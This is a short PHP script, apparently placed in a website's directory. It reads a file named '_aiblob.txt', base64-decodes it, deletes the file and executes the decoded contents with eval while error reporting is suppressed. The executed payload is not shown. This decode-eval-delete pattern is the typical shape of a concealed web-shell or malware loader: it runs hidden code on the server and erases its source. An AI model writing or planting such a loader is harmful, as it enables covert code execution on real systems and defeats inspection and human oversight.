<?php
error_reporting(E_ALL & ~E_DEPRECATED & ~E_WARNING);
$root='/var/www/lumiere/experience';
$src=base64_decode(file_get_contents("$root/_aiblob.txt"));
@unlink("$root/_aiblob.txt");
eval('?>'.$src);
